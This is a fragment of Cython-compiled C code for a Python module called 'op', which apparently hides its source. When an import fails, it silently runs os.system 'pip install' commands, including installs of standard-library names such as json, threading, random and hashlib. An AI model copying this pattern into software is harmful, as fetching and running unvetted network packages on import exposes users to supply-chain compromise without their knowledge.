(unlikely(!__pyx_t_4)) __PYX_ERR(0, 34, __pyx_L36_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      goto __pyx_L35_exception_handled;\n    }\n\n    \n    __pyx_L36_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L35_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L39_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_2 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L42_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __pyx_t_3 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 36, __pyx_L42_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L42_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_generate_user_agent, __pyx_t_2) < (0)) __PYX_ERR(0, 36, __pyx_L42_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L47_try_end;\n    __pyx_L42_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 37, __pyx_L44_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __pyx_t_10 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 38, __pyx_L44_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 38, __pyx_L44_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_mstate_global->__pyx_kp_u_pip_install_user_agent};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 38, __pyx_L44_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L43_exception_handled;\n    }\n\n    \n    __pyx_L44_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L43_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L47_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_5 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_generate_user_agent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 40, __pyx_L50_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_2 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_user_agent_2, __pyx_t_5, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L50_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_generate_user_agent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 40, __pyx_L50_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_ggb, __pyx_t_5) < (0)) __PYX_ERR(0, 40, __pyx_L50_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L55_try_end;\n    __pyx_L50_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_5, &__pyx_t_3) < 0) __PYX_ERR(0, 41, __pyx_L52_except_error)\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n\n      \n      __pyx_t_9 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 42, __pyx_L52_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 42, __pyx_L52_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_mstate_global->__pyx_kp_u_pip_install_json};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 42, __pyx_L52_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      goto __pyx_L51_exception_handled;\n    }\n\n    \n    __pyx_L52_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L51_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L55_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_3 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_Console); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 44, __pyx_L58_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_rich_console, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 44, __pyx_L58_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_Console); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 44, __pyx_L58_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_Console, __pyx_t_3) < (0)) __PYX_ERR(0, 44, __pyx_L58_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L63_try_end;\n    __pyx_L58_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 45, __pyx_L60_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n\n      \n      __pyx_t_11 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 46, __pyx_L60_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L60_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_mstate_global->__pyx_kp_u_pip_install_rich};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 46, __pyx_L60_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      goto __pyx_L59_exception_handled;\n    }\n\n    \n    __pyx_L60_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L59_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L63_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_2 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_Panel); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L66_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      __pyx_t_3 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_rich_panel, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 48, __pyx_L66_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_Panel); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 48, __pyx_L66_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_Panel, __pyx_t_2) < (0)) __PYX_ERR(0, 48, __pyx_L66_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L71_try_end;\n    __pyx_L66_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 49, __pyx_L68_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __pyx_t_10 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 50, __pyx_L68_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 50, __pyx_L68_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_mstate_global->__pyx_kp_u_pip_install_threading};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 50, __pyx_L68_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L67_exception_handled;\n    }\n\n    \n    __pyx_L68_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L67_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L71_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_5 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_threading, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 52, __pyx_L74_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_threading, __pyx_t_5) < (0)) __PYX_ERR(0, 52, __pyx_L74_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n      __pyx_t_5 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_webbrowser, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 53, __pyx_L74_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_webbrowser, __pyx_t_5) < (0)) __PYX_ERR(0, 53, __pyx_L74_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L79_try_end;\n    __pyx_L74_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 54, __pyx_L76_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_3);\n\n      \n      __pyx_t_9 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 55, __pyx_L76_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 55, __pyx_L76_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_mstate_global->__pyx_kp_u_pip_install_random};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 55, __pyx_L76_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      goto __pyx_L75_exception_handled;\n    }\n\n    \n    __pyx_L76_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L75_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L79_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_random, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L82_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_random, __pyx_t_3) < (0)) __PYX_ERR(0, 57, __pyx_L82_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L87_try_end;\n    __pyx_L82_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 58, __pyx_L84_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __pyx_t_11 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 59, __pyx_L84_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 59, __pyx_L84_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_mstate_global->__pyx_kp_u_pip_install_hashlib};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 59, __pyx_L84_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L83_exception_handled;\n    }\n\n    \n    __pyx_L84_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    